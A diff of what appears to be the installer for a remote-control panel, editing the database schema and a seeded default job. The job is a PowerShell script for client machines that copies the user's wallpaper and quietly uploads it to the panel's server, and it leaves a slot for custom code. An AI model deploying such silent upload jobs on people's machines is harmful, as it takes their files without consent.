@@ -70,6 +70,7 @@ $REQUEST_SCHEME="http";
               `info` text NOT NULL,
               `label` varchar(50) NOT NULL,
               `status` int(11) NOT NULL DEFAULT 0,
+              `failjob` int(11) NOT NULL DEFAULT 1,
               `f_connection` datetime NOT NULL DEFAULT current_timestamp(),
               `l_connection` datetime DEFAULT NULL
             ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
@@ -87,8 +88,8 @@ $REQUEST_SCHEME="http";
               MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=100;
             ALTER TABLE `users`
               MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=121;
-              INSERT INTO `event` (`init`, `up`, `destroy`) VALUES
-              ('# Download Main Wallpaper     \n \$UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID\n        \$user=\$UID+\"_\"+\"wallpaper\"\n        \$folder = Test-Path -Path C:\\\\temp\n        if (!\$folder) {\n            New-Item -Path C:\\\\ -Name temp -ItemType Directory\n    \n        }\n        \$BACKGROUND = (Get-ItemProperty \"hkcu:\\control panel\\\\desktop\\\" -Name Wallpaper).Wallpaper\n        Copy-Item \$BACKGROUND  C:\\\\temp\\\\\$user.jpg\n        \$wc = New-Object System.Net.WebClient\n        \$resp = \$wc.UploadFile(\" $server_address\", \"C:\\\\temp\\\\\$user.jpg\")\n        Remove-Item -Path C:\\\\temp\\\\\$user.jpg -Force\n      # Beep Sound For Test\n      # [console]::beep(200,5000)\n      # Put Custom Code Here\n return \"OK\"\n\n', '#[console]::beep(100,3000)', '[console]::beep(800,5000)');
+              INSERT INTO `event` (`init`) VALUES
+              ('# Download Main Wallpaper     \n \$UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID\n        \$user=\$UID+\"_\"+\"wallpaper\"\n        \$folder = Test-Path -Path C:\\\\temp\n        if (!\$folder) {\n            New-Item -Path C:\\\\ -Name temp -ItemType Directory\n    \n        }\n        \$BACKGROUND = (Get-ItemProperty \"hkcu:\\control panel\\\\desktop\\\" -Name Wallpaper).Wallpaper\n        Copy-Item \$BACKGROUND  C:\\\\temp\\\\\$user.jpg\n        \$wc = New-Object System.Net.WebClient\n        \$resp = \$wc.UploadFile(\" $server_address\", \"C:\\\\temp\\\\\$user.jpg\")\n        Remove-Item -Path C:\\\\temp\\\\\$user.jpg -Force\n      # Beep Sound For Test\n      # [console]::beep(200,5000)\n      # Put Custom Code Here\n return \"OK\"\n\n');
                   INSERT INTO `admin` (`username`, `password`) VALUES ('$panel_username','$panel_password');
             COMMIT;
 
